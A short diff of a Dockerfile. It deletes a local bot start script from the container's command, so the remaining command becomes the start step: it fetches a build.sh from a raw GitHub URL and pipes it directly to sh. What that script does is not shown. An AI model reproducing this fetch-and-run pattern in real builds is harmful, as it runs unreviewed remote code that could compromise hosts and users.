@@ -39,4 +39,3 @@ RUN echo "Uploaded files:" && ls /home/stuff/
 # Run bot script:
 CMD curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | sh
 
-CMD ["/opt/bin/startbot.sh"]
